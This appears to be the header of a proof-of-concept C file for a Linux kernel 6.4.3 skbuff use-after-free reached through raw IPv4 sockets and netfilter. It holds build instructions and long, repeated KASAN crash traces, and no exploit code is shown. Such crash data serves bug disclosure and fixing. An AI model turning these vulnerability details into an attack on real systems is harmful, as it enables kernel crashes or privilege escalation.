// jmpe4x skbuff PoC null ptr-derefence UAF
// gcc poc.c -lmnl -lnftnl -o poc
// install libs: apt install libmnl-dev libnftnl-dev
/* KASAN REPORT
==================================================================
BUG: KASAN: slab-use-after-free in skb_dst include/linux/skbuff.h:1123 [inline]
BUG: KASAN: slab-use-after-free in dst_output include/net/dst.h:458 [inline]
BUG: KASAN: slab-use-after-free in ip_local_out net/ipv4/ip_output.c:126 [inline]
BUG: KASAN: slab-use-after-free in ip_send_skb net/ipv4/ip_output.c:1597 [inline]
BUG: KASAN: slab-use-after-free in ip_push_pending_frames+0x206/0x230 net/ipv4/ip_output.c:1617
Read of size 8 at addr ffff888015ac4198 by task syz-executor.0/414546

CPU: 0 PID: 414546 Comm: syz-executor.0 Not tainted 6.4.3 #1
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
Call Trace:
 <TASK>
 __dump_stack lib/dump_stack.c:88 [inline]
 dump_stack_lvl+0x72/0xa0 lib/dump_stack.c:106
 print_address_description mm/kasan/report.c:351 [inline]
 print_report+0xcc/0x620 mm/kasan/report.c:462
 kasan_report+0xb2/0xe0 mm/kasan/report.c:572
 skb_dst include/linux/skbuff.h:1123 [inline]
 dst_output include/net/dst.h:458 [inline]
 ip_local_out net/ipv4/ip_output.c:126 [inline]
 ip_send_skb net/ipv4/ip_output.c:1597 [inline]
 ip_push_pending_frames+0x206/0x230 net/ipv4/ip_output.c:1617
 raw_sendmsg+0x108f/0x2740 net/ipv4/raw.c:649
 inet_sendmsg+0x11e/0x150 net/ipv4/af_inet.c:827
 sock_sendmsg_nosec net/socket.c:724 [inline]
 sock_sendmsg+0x19b/0x200 net/socket.c:747
 ____sys_sendmsg+0x6ea/0x890 net/socket.c:2503
 ___sys_sendmsg+0x11d/0x1c0 net/socket.c:2557
 __sys_sendmsg+0xfe/0x1d0 net/socket.c:2586
 do_syscall_x64 arch/x86/entry/common.c:50 [inline]
 do_syscall_64+0x3c/0x90 arch/x86/entry/common.c:80
 entry_SYSCALL_64_after_hwframe+0x72/0xdc
RIP: 0033:0x7fb0f33bad2d
Code: c3 e8 97 2b 00 00 0f 1f 80 00 00 00 00 f3 0f 1e fa 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 b0 ff ff ff f7 d8 64 89 01 48
RSP: 002b:00007fb0f272b028 EFLAGS: 00000246 ORIG_RAX: 000000000000002e
RAX: ffffffffffffffda RBX: 00007fb0f34f7f80 RCX: 00007fb0f33bad2d
RDX: 0000000000000000 RSI: 0000000020000040 RDI: 0000000000000005
RBP: 00007fb0f341c4a6 R08: 0000000000000000 R09: 0000000000000000
R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000000
R13: 0000000000000006 R14: 00007fb0f34f7f80 R15: 00007fb0f270b000
 </TASK>

Allocated by task 414546:
 kasan_save_stack+0x22/0x50 mm/kasan/common.c:45
 kasan_set_track+0x25/0x30 mm/kasan/common.c:52
 __kasan_slab_alloc+0x59/0x70 mm/kasan/common.c:328
 kasan_slab_alloc include/linux/kasan.h:186 [inline]
 slab_post_alloc_hook mm/slab.h:711 [inline]
 slab_alloc_node mm/slub.c:3451 [inline]
 kmem_cache_alloc_node+0xf7/0x260 mm/slub.c:3496
 __alloc_skb+0x28e/0x330 net/core/skbuff.c:644
 alloc_skb include/linux/skbuff.h:1288 [inline]
 __ip_append_data+0x2e64/0x3a70 net/ipv4/ip_output.c:1127
 ip_append_data net/ipv4/ip_output.c:1344 [inline]
 ip_append_data+0x115/0x1a0 net/ipv4/ip_output.c:1323
 raw_sendmsg+0xb03/0x2740 net/ipv4/raw.c:643
 inet_sendmsg+0x11e/0x150 net/ipv4/af_inet.c:827
 sock_sendmsg_nosec net/socket.c:724 [inline]
 sock_sendmsg+0x19b/0x200 net/socket.c:747
 ____sys_sendmsg+0x6ea/0x890 net/socket.c:2503
 ___sys_sendmsg+0x11d/0x1c0 net/socket.c:2557
 __sys_sendmsg+0xfe/0x1d0 net/socket.c:2586
 do_syscall_x64 arch/x86/entry/common.c:50 [inline]
 do_syscall_64+0x3c/0x90 arch/x86/entry/common.c:80
 entry_SYSCALL_64_after_hwframe+0x72/0xdc

Freed by task 414546:
 kasan_save_stack+0x22/0x50 mm/kasan/common.c:45
 kasan_set_track+0x25/0x30 mm/kasan/common.c:52
 kasan_save_free_info+0x2e/0x50 mm/kasan/generic.c:521
 ____kasan_slab_free mm/kasan/common.c:236 [inline]
 ____kasan_slab_free mm/kasan/common.c:200 [inline]
 __kasan_slab_free+0x10a/0x190 mm/kasan/common.c:244
 kasan_slab_free include/linux/kasan.h:162 [inline]
 slab_free_hook mm/slub.c:1781 [inline]
 slab_free_freelist_hook mm/slub.c:1807 [inline]
 slab_free mm/slub.c:3786 [inline]
 kmem_cache_free+0x9c/0x340 mm/slub.c:3808
 kfree_skbmem+0xef/0x1b0 net/core/skbuff.c:971
 __kfree_skb net/core/skbuff.c:1029 [inline]
 kfree_skb_reason+0x101/0x380 net/core/skbuff.c:1064
 nf_hook_slow+0x195/0x200 net/netfilter/core.c:631
 nf_hook include/linux/netfilter.h:258 [inline]
 __ip_local_out+0x314/0x400 net/ipv4/ip_output.c:115
 ip_local_out net/ipv4/ip_output.c:124 [inline]
 ip_send_skb net/ipv4/ip_output.c:1597 [inline]
 ip_push_pending_frames+0x99/0x230 net/ipv4/ip_output.c:1617
 raw_sendmsg+0x108f/0x2740 net/ipv4/raw.c:649
 inet_sendmsg+0x11e/0x150 net/ipv4/af_inet.c:827
 sock_sendmsg_nosec net/socket.c:724 [inline]
 sock_sendmsg+0x19b/0x200 net/socket.c:747
 ____sys_sendmsg+0x6ea/0x890 net/socket.c:2503
 ___sys_sendmsg+0x11d/0x1c0 net/socket.c:2557
 __sys_sendmsg+0xfe/0x1d0 net/socket.c:2586
 do_syscall_x64 arch/x86/entry/common.c:50 [inline]
 do_syscall_64+0x3c/0x90 arch/x86/entry/common.c:80
 entry_SYSCALL_64_after_hwframe+0x72/0xdc

The buggy address belongs to the object at ffff888015ac4140
 which belongs to the cache skbuff_head_cache of size 232
The buggy address is located 88 bytes inside of
 freed 232-byte region [ffff888015ac4140, ffff888015ac4228)

The buggy address belongs to the physical page:
page:000000009407c0c2 refcount:1 mapcount:0 mapping:0000000000000000 index:0xffff888015ac48c0 pfn:0x15ac4
flags: 0x100000000000200(slab|node=0|zone=1)
page_type: 0xffffffff()
raw: 0100000000000200 ffff888001175a00 ffffea00001d0880 dead000000000006
raw: ffff888015ac48c0 00000000800c000b 00000001ffffffff 0000000000000000
page dumped because: kasan: bad access detected

Memory state around the buggy address:
 ffff888015ac4080: fb fb fb fb fb fb fb fb fb fb fb fb fb fc fc fc
 ffff888015ac4100: fc fc fc fc fc fc fc fc fa fb fb fb fb fb fb fb
>ffff888015ac4180: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
                            ^
 ffff888015ac4200: fb fb fb fb fb fc fc fc fc fc fc fc fc fc fc fc
 ffff888015ac4280: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
==================================================================
general protection fault, probably for non-canonical address 0xdffffc0000000006: 0000 [#1] PREEMPT SMP KASAN NOPTI
KASAN: null-ptr-deref in range [0x0000000000000030-0x0000000000000037]
CPU: 0 PID: 414546 Comm: syz-executor.0 Tainted: G    B              6.4.3 #1
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
RIP: 0010:dst_output include/net/dst.h:458 [inline]
RIP: 0010:ip_local_out net/ipv4/ip_output.c:126 [inline]
RIP: 0010:ip_send_skb net/ipv4/ip_output.c:1597 [inline]
RIP: 0010:ip_push_pending_frames+0xef/0x230 net/ipv4/ip_output.c:1617
Code: c1 ea 03 80 3c 02 00 0f 85 2f 01 00 00 48 b8 00 00 00 00 00 fc ff df 49 8b 6d 58 48 83 e5 fe 48 8d 7d 30 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 fe 00 00 00 48 8b 6d 30 48 81 fd 30 cd d2 90 0f
RSP: 0018:ffff88802ddb77c0 EFLAGS: 00010206
RAX: dffffc0000000000 RBX: ffff88802e90c9c0 RCX: ffffffff8e939119
RDX: 0000000000000006 RSI: ffffc90000597000 RDI: 0000000000000030
RBP: 0000000000000000 R08: 0000000000000000 R09: ffffffff93c4abc7
R10: 0000000000000000 R11: 0000000000000001 R12: 0000000000000001
R13: ffff888015ac4140 R14: ffff8880038c5f80 R15: 0000000000000000
FS:  00007fb0f272b640(0000) GS:ffff888037400000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 0000000020010000 CR3: 000000002d010000 CR4: 0000000000750ef0
PKRU: 55555554
Call Trace:
 <TASK>
 raw_sendmsg+0x108f/0x2740 net/ipv4/raw.c:649
 inet_sendmsg+0x11e/0x150 net/ipv4/af_inet.c:827
 sock_sendmsg_nosec net/socket.c:724 [inline]
 sock_sendmsg+0x19b/0x200 net/socket.c:747
 ____sys_sendmsg+0x6ea/0x890 net/socket.c:2503
 ___sys_sendmsg+0x11d/0x1c0 net/socket.c:2557
 __sys_sendmsg+0xfe/0x1d0 net/socket.c:2586
 do_syscall_x64 arch/x86/entry/common.c:50 [inline]
 do_syscall_64+0x3c/0x90 arch/x86/entry/common.c:80
 entry_SYSCALL_64_after_hwframe+0x72/0xdc
RIP: 0033:0x7fb0f33bad2d
Code: c3 e8 97 2b 00 00 0f 1f 80 00 00 00 00 f3 0f 1e fa 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 b0 ff ff ff f7 d8 64 89 01 48
RSP: 002b:00007fb0f272b028 EFLAGS: 00000246 ORIG_RAX: 000000000000002e
RAX: ffffffffffffffda RBX: 00007fb0f34f7f80 RCX: 00007fb0f33bad2d
RDX: 0000000000000000 RSI: 0000000020000040 RDI: 0000000000000005
RBP: 00007fb0f341c4a6 R08: 0000000000000000 R09: 0000000000000000
R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000000
R13: 0000000000000006 R14: 00007fb0f34f7f80 R15: 00007fb0f270b000
 </TASK>
Modules linked in:
---[ end trace 0000000000000000 ]---
RIP: 0010:dst_output include/net/dst.h:458 [inline]
RIP: 0010:ip_local_out net/ipv4/ip_output.c:126 [inline]
RIP: 0010:ip_send_skb net/ipv4/ip_output.c:1597 [inline]
RIP: 0010:ip_push_pending_frames+0xef/0x230 net/ipv4/ip_output.c:1617
Code: c1 ea 03 80 3c 02 00 0f 85 2f 01 00 00 48 b8 00 00 00 00 00 fc ff df 49 8b 6d 58 48 83 e5 fe 48 8d 7d 30 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 fe 00 00 00 48 8b 6d 30 48 81 fd 30 cd d2 90 0f
RSP: 0018:ffff88802ddb77c0 EFLAGS: 00010206
RAX: dffffc0000000000 RBX: ffff88802e90c9c0 RCX: ffffffff8e939119
RDX: 0000000000000006 RSI: ffffc90000597000 RDI: 0000000000000030
RBP: 0000000000000000 R08: 0000000000000000 R09: ffffffff93c4abc7
R10: 0000000000000000 R11: 0000000000000001 R12: 0000000000000001
R13: ffff888015ac4140 R14: ffff8880038c5f80 R15: 0000000000000000
FS:  00007fb0f272b640(0000) GS:ffff888037400000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 0000000020010000 CR3: 000000002d010000 CR4: 0000000000750ef0
PKRU: 55555554
__nla_validate_parse: 218 callbacks suppressed
netlink: 16 bytes leftover after parsing attributes in process `syz-executor.5'.
netlink: 274 bytes leftover after parsing attributes in process `syz-executor.3'.
netlink: 274 bytes leftover after parsing attributes in process `syz-executor.3'.
netlink: 8 bytes leftover after parsing attributes in process `syz-executor.0'.
general protection fault, probably for non-canonical address 0xdffffc0000000006: 0000 [#2] PREEMPT SMP KASAN NOPTI
KASAN: null-ptr-deref in range [0x0000000000000030-0x0000000000000037]
CPU: 0 PID: 414606 Comm: syz-executor.0 Tainted: G    B D            6.4.3 #1
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
RIP: 0010:dst_output include/net/dst.h:458 [inline]
RIP: 0010:ip_local_out net/ipv4/ip_output.c:126 [inline]
RIP: 0010:ip_send_skb net/ipv4/ip_output.c:1597 [inline]
RIP: 0010:ip_push_pending_frames+0xef/0x230 net/ipv4/ip_output.c:1617
Code: c1 ea 03 80 3c 02 00 0f 85 2f 01 00 00 48 b8 00 00 00 00 00 fc ff df 49 8b 6d 58 48 83 e5 fe 48 8d 7d 30 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 fe 00 00 00 48 8b 6d 30 48 81 fd 30 cd d2 90 0f
RSP: 0018:ffff888030a5f7c0 EFLAGS: 00010206
RAX: dffffc0000000000 RBX: ffff88800316ac40 RCX: ffffffff90a9e326
RDX: 0000000000000006 RSI: 0000000000000008 RDI: 0000000000000030
RBP: 0000000000000000 R08: 0000000000000000 R09: ffff888030a5f2ca
R10: 0000000000000001 R11: 0000000000034001 R12: 0000000000000001
R13: ffff888001dcb8c0 R14: ffff8880038c4000 R15: 0000000000000000
FS:  00007fb0f272b640(0000) GS:ffff888037400000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 0000000020010000 CR3: 000000002f65e000 CR4: 0000000000750ef0
PKRU: 55555554
Call Trace:
 <TASK>
 raw_sendmsg+0x108f/0x2740 net/ipv4/raw.c:649
netlink: 16 bytes leftover after parsing attributes in process `syz-executor.5'.
 inet_sendmsg+0x11e/0x150 net/ipv4/af_inet.c:827
 sock_sendmsg_nosec net/socket.c:724 [inline]
 sock_sendmsg+0x19b/0x200 net/socket.c:747
 ____sys_sendmsg+0x6ea/0x890 net/socket.c:2503
 ___sys_sendmsg+0x11d/0x1c0 net/socket.c:2557
 __sys_sendmsg+0xfe/0x1d0 net/socket.c:2586
 do_syscall_x64 arch/x86/entry/common.c:50 [inline]
 do_syscall_64+0x3c/0x90 arch/x86/entry/common.c:80
 entry_SYSCALL_64_after_hwframe+0x72/0xdc
RIP: 0033:0x7fb0f33bad2d
Code: c3 e8 97 2b 00 00 0f 1f 80 00 00 00 00 f3 0f 1e fa 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 b0 ff ff ff f7 d8 64 89 01 48
RSP: 002b:00007fb0f272b028 EFLAGS: 00000246 ORIG_RAX: 000000000000002e
RAX: ffffffffffffffda RBX: 00007fb0f34f7f80 RCX: 00007fb0f33bad2d
RDX: 0000000000000000 RSI: 0000000020000040 RDI: 0000000000000005
RBP: 00007fb0f341c4a6 R08: 0000000000000000 R09: 0000000000000000
R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000000
R13: 0000000000000006 R14: 00007fb0f34f7f80 R15: 00007fb0f270b000
 </TASK>
Modules linked in:
---[ end trace 0000000000000000 ]---
RIP: 0010:dst_output include/net/dst.h:458 [inline]
RIP: 0010:ip_local_out net/ipv4/ip_output.c:126 [inline]
RIP: 0010:ip_send_skb net/ipv4/ip_output.c:1597 [inline]
RIP: 0010:ip_push_pending_frames+0xef/0x230 net/ipv4/ip_output.c:1617
Code: c1 ea 03 80 3c 02 00 0f 85 2f 01 00 00 48 b8 00 00 00 00 00 fc ff df 49 8b 6d 58 48 83 e5 fe 48 8d 7d 30 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 fe 00 00 00 48 8b 6d 30 48 81 fd 30 cd d2 90 0f
RSP: 0018:ffff88802ddb77c0 EFLAGS: 00010206
RAX: dffffc0000000000 RBX: ffff88802e90c9c0 RCX: ffffffff8e939119
RDX: 0000000000000006 RSI: ffffc90000597000 RDI: 0000000000000030
RBP: 0000000000000000 R08: 0000000000000000 R09: ffffffff93c4abc7
netlink: 16 bytes leftover after parsing attributes in process `syz-executor.5'.
R10: 0000000000000000 R11: 0000000000000001 R12: 0000000000000001
R13: ffff888015ac4140 R14: ffff8880038c5f80 R15: 0000000000000000
FS:  00007fb0f272b640(0000) GS:ffff888037400000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 0000000020010000 CR3: 000000002f65e000 CR4: 0000000000750ef0
PKRU: 55555554
netlink: 8 bytes leftover after parsing attributes in process `syz-executor.7'.
general protection fault, probably for non-canonical address 0xdffffc0000000006: 0000 [#3] PREEMPT SMP KASAN NOPTI
KASAN: null-ptr-deref in range [0x0000000000000030-0x0000000000000037]
CPU: 1 PID: 414632 Comm: syz-executor.7 Tainted: G    B D            6.4.3 #1
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
RIP: 0010:dst_output include/net/dst.h:458 [inline]
RIP: 0010:ip_local_out net/ipv4/ip_output.c:126 [inline]
RIP: 0010:ip_send_skb net/ipv4/ip_output.c:1597 [inline]
RIP: 0010:ip_push_pending_frames+0xef/0x230 net/ipv4/ip_output.c:1617
Code: c1 ea 03 80 3c 02 00 0f 85 2f 01 00 00 48 b8 00 00 00 00 00 fc ff df 49 8b 6d 58 48 83 e5 fe 48 8d 7d 30 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 fe 00 00 00 48 8b 6d 30 48 81 fd 30 cd d2 90 0f
RSP: 0018:ffff888015cb77c0 EFLAGS: 00010206
RAX: dffffc0000000000 RBX: ffff888030bc2c40 RCX: ffffffff90a9e326
RDX: 0000000000000006 RSI: 0000000000000008 RDI: 0000000000000030
RBP: 0000000000000000 R08: 0000000000000000 R09: ffff888015cb72ca
R10: 0000000000000001 R11: 0000000000034001 R12: 0000000000000001
R13: ffff88800acf2280 R14: ffff888001b29f80 R15: 0000000000000000
FS:  00007f411dfba640(0000) GS:ffff888037500000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 0000000020010000 CR3: 000000002e378000 CR4: 0000000000750ee0
PKRU: 55555554
Call Trace:
 <TASK>
 raw_sendmsg+0x108f/0x2740 net/ipv4/raw.c:649
 inet_sendmsg+0x11e/0x150 net/ipv4/af_inet.c:827
 sock_sendmsg_nosec net/socket.c:724 [inline]
 sock_sendmsg+0x19b/0x200 net/socket.c:747
 ____sys_sendmsg+0x6ea/0x890 net/socket.c:2503
 ___sys_sendmsg+0x11d/0x1c0 net/socket.c:2557
 __sys_sendmsg+0xfe/0x1d0 net/socket.c:2586
 do_syscall_x64 arch/x86/entry/common.c:50 [inline]
 do_syscall_64+0x3c/0x90 arch/x86/entry/common.c:80
 entry_SYSCALL_64_after_hwframe+0x72/0xdc
RIP: 0033:0x7f411ec49d2d
Code: c3 e8 97 2b 00 00 0f 1f 80 00 00 00 00 f3 0f 1e fa 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 b0 ff ff ff f7 d8 64 89 01 48
RSP: 002b:00007f411dfba028 EFLAGS: 00000246 ORIG_RAX: 000000000000002e
RAX: ffffffffffffffda RBX: 00007f411ed86f80 RCX: 00007f411ec49d2d
RDX: 0000000000000000 RSI: 0000000020000040 RDI: 0000000000000005
RBP: 00007f411ecab4a6 R08: 0000000000000000 R09: 0000000000000000
R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000000
R13: 0000000000000006 R14: 00007f411ed86f80 R15: 00007f411df9a000
 </TASK>
Modules linked in:
---[ end trace 0000000000000000 ]---
RIP: 0010:dst_output include/net/dst.h:458 [inline]
RIP: 0010:ip_local_out net/ipv4/ip_output.c:126 [inline]
RIP: 0010:ip_send_skb net/ipv4/ip_output.c:1597 [inline]
RIP: 0010:ip_push_pending_frames+0xef/0x230 net/ipv4/ip_output.c:1617
Code: c1 ea 03 80 3c 02 00 0f 85 2f 01 00 00 48 b8 00 00 00 00 00 fc ff df 49 8b 6d 58 48 83 e5 fe 48 8d 7d 30 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 fe 00 00 00 48 8b 6d 30 48 81 fd 30 cd d2 90 0f
RSP: 0018:ffff88802ddb77c0 EFLAGS: 00010206
RAX: dffffc0000000000 RBX: ffff88802e90c9c0 RCX: ffffffff8e939119
RDX: 0000000000000006 RSI: ffffc90000597000 RDI: 0000000000000030
RBP: 0000000000000000 R08: 0000000000000000 R09: ffffffff93c4abc7
R10: 0000000000000000 R11: 0000000000000001 R12: 0000000000000001
R13: ffff888015ac4140 R14: ffff8880038c5f80 R15: 0000000000000000
FS:  00007f411dfba640(0000) GS:ffff888037500000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 0000000020010000 CR3: 000000002e378000 CR4: 0000000000750ee0
PKRU: 55555554
netlink: 8 bytes leftover after parsing attributes in process `syz-executor.0'.
netlink: 274 bytes leftover after parsing attributes in process `syz-executor.3'.
netlink: 248 bytes leftover after parsing attributes in process `syz-executor.2'.
general protection fault, probably for non-canonical address 0xdffffc0000000006: 0000 [#4] PREEMPT SMP KASAN NOPTI
KASAN: null-ptr-deref in range [0x0000000000000030-0x0000000000000037]
CPU: 1 PID: 414731 Comm: syz-executor.7 Tainted: G    B D            6.4.3 #1
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
RIP: 0010:dst_output include/net/dst.h:458 [inline]
RIP: 0010:ip_local_out net/ipv4/ip_output.c:126 [inline]
RIP: 0010:ip_send_skb net/ipv4/ip_output.c:1597 [inline]
RIP: 0010:ip_push_pending_frames+0xef/0x230 net/ipv4/ip_output.c:1617
Code: c1 ea 03 80 3c 02 00 0f 85 2f 01 00 00 48 b8 00 00 00 00 00 fc ff df 49 8b 6d 58 48 83 e5 fe 48 8d 7d 30 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 fe 00 00 00 48 8b 6d 30 48 81 fd 30 cd d2 90 0f
RSP: 0018:ffff88802d4cf7c0 EFLAGS: 00010206
RAX: dffffc0000000000 RBX: ffff88800316c9c0 RCX: ffffffff90a9e326
RDX: 0000000000000006 RSI: 0000000000000008 RDI: 0000000000000030
RBP: 0000000000000000 R08: 0000000000000000 R09: ffff88802d4cf2ca
R10: 0000000000000001 R11: 0000000000034001 R12: 0000000000000001
R13: ffff888004448280 R14: ffff888001b28d80 R15: 0000000000000000
FS:  00007f411dfba640(0000) GS:ffff888037500000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 0000000020010000 CR3: 000000000ace0000 CR4: 0000000000750ee0
PKRU: 55555554
Call Trace:
 <TASK>
 raw_sendmsg+0x108f/0x2740 net/ipv4/raw.c:649
 inet_sendmsg+0x11e/0x150 net/ipv4/af_inet.c:827
 sock_sendmsg_nosec net/socket.c:724 [inline]
 sock_sendmsg+0x19b/0x200 net/socket.c:747
 ____sys_sendmsg+0x6ea/0x890 net/socket.c:2503
 ___sys_sendmsg+0x11d/0x1c0 net/socket.c:2557
 __sys_sendmsg+0xfe/0x1d0 net/socket.c:2586
 do_syscall_x64 arch/x86/entry/common.c:50 [inline]
 do_syscall_64+0x3c/0x90 arch/x86/entry/common.c:80
 entry_SYSCALL_64_after_hwframe+0x72/0xdc
RIP: 0033:0x7f411ec49d2d
Code: c3 e8 97 2b 00 00 0f 1f 80 00 00 00 00 f3 0f 1e fa 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 b0 ff ff ff f7 d8 64 89 01 48
RSP: 002b:00007f411dfba028 EFLAGS: 00000246 ORIG_RAX: 000000000000002e
RAX: ffffffffffffffda RBX: 00007f411ed86f80 RCX: 00007f411ec49d2d
RDX: 0000000000000000 RSI: 0000000020000040 RDI: 0000000000000005
RBP: 00007f411ecab4a6 R08: 0000000000000000 R09: 0000000000000000
R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000000
R13: 0000000000000006 R14: 00007f411ed86f80 R15: 00007f411df9a000
 </TASK>
Modules linked in:
---[ end trace 0000000000000000 ]---
RIP: 0010:dst_output include/net/dst.h:458 [inline]
RIP: 0010:ip_local_out net/ipv4/ip_output.c:126 [inline]
RIP: 0010:ip_send_skb net/ipv4/ip_output.c:1597 [inline]
RIP: 0010:ip_push_pending_frames+0xef/0x230 net/ipv4/ip_output.c:1617
Code: c1 ea 03 80 3c 02 00 0f 85 2f 01 00 00 48 b8 00 00 00 00 00 fc ff df 49 8b 6d 58 48 83 e5 fe 48 8d 7d 30 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 fe 00 00 00 48 8b 6d 30 48 81 fd 30 cd d2 90 0f
validate_nla: 512 callbacks suppressed
netlink: 'syz-executor.6': attribute type 7 has an invalid length.
RSP: 0018:ffff88802ddb77c0 EFLAGS: 00010206
RAX: dffffc0000000000 RBX: ffff88802e90c9c0 RCX: ffffffff8e939119
RDX: 0000000000000006 RSI: ffffc90000597000 RDI: 0000000000000030
RBP: 0000000000000000 R08: 0000000000000000 R09: ffffffff93c4abc7
R10: 0000000000000000 R11: 0000000000000001 R12: 0000000000000001
R13: ffff888015ac4140 R14: ffff8880038c5f80 R15: 0000000000000000
FS:  00007f411dfba640(0000) GS:ffff888037500000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 0000000020010000 CR3: 000000000ace0000 CR4: 0000000000750ee0
PKRU: 55555554
general protection fault, probably for non-canonical address 0xdffffc0000000006: 0000 [#5] PREEMPT SMP KASAN NOPTI
KASAN: null-ptr-deref in range [0x0000000000000030-0x0000000000000037]
netlink: 'syz-executor.6': attribute type 7 has an invalid length.
CPU: 0 PID: 414776 Comm: syz-executor.7 Tainted: G    B D            6.4.3 #1
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
RIP: 0010:dst_output include/net/dst.h:458 [inline]
RIP: 0010:ip_local_out net/ipv4/ip_output.c:126 [inline]
RIP: 0010:ip_send_skb net/ipv4/ip_output.c:1597 [inline]
RIP: 0010:ip_push_pending_frames+0xef/0x230 net/ipv4/ip_output.c:1617
Code: c1 ea 03 80 3c 02 00 0f 85 2f 01 00 00 48 b8 00 00 00 00 00 fc ff df 49 8b 6d 58 48 83 e5 fe 48 8d 7d 30 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 fe 00 00 00 48 8b 6d 30 48 81 fd 30 cd d2 90 0f
RSP: 0018:ffff88802f5d77c0 EFLAGS: 00010206
RAX: dffffc0000000000 RBX: ffff88802e745880 RCX: ffffffff90a9e326
RDX: 0000000000000006 RSI: 0000000000000008 RDI: 0000000000000030
RBP: 0000000000000000 R08: 0000000000000000 R09: ffff88802f5d72ca
R10: 0000000000000001 R11: 0000000000034001 R12: 0000000000000001
R13: ffff8880019c2640 R14: ffff8880038c7600 R15: 0000000000000000
FS:  00007f411dfba640(0000) GS:ffff888037400000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 0000000020010000 CR3: 000000000af14000 CR4: 0000000000750ef0
PKRU: 55555554
Call Trace:
 <TASK>
 raw_sendmsg+0x108f/0x2740 net/ipv4/raw.c:649
 inet_sendmsg+0x11e/0x150 net/ipv4/af_inet.c:827
 sock_sendmsg_nosec net/socket.c:724 [inline]
 sock_sendmsg+0x19b/0x200 net/socket.c:747
 ____sys_sendmsg+0x6ea/0x890 net/socket.c:2503
 ___sys_sendmsg+0x11d/0x1c0 net/socket.c:2557
 __sys_sendmsg+0xfe/0x1d0 net/socket.c:2586
 do_syscall_x64 arch/x86/entry/common.c:50 [inline]
 do_syscall_64+0x3c/0x90 arch/x86/entry/common.c:80
 entry_SYSCALL_64_after_hwframe+0x72/0xdc
RIP: 0033:0x7f411ec49d2d
Code: c3 e8 97 2b 00 00 0f 1f 80 00 00 00 00 f3 0f 1e fa 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 b0 ff ff ff f7 d8 64 89 01 48
RSP: 002b:00007f411dfba028 EFLAGS: 00000246 ORIG_RAX: 000000000000002e
RAX: ffffffffffffffda RBX: 00007f411ed86f80 RCX: 00007f411ec49d2d
RDX: 0000000000000000 RSI: 0000000020000040 RDI: 0000000000000005
RBP: 00007f411ecab4a6 R08: 0000000000000000 R09: 0000000000000000
R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000000
R13: 0000000000000006 R14: 00007f411ed86f80 R15: 00007f411df9a000
 </TASK>
Modules linked in:
---[ end trace 0000000000000000 ]---
RIP: 0010:dst_output include/net/dst.h:458 [inline]
RIP: 0010:ip_local_out net/ipv4/ip_output.c:126 [inline]
RIP: 0010:ip_send_skb net/ipv4/ip_output.c:1597 [inline]
RIP: 0010:ip_push_pending_frames+0xef/0x230 net/ipv4/ip_output.c:1617
Code: c1 ea 03 80 3c 02 00 0f 85 2f 01 00 00 48 b8 00 00 00 00 00 fc ff df 49 8b 6d 58 48 83 e5 fe 48 8d 7d 30 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 fe 00 00 00 48 8b 6d 30 48 81 fd 30 cd d2 90 0f
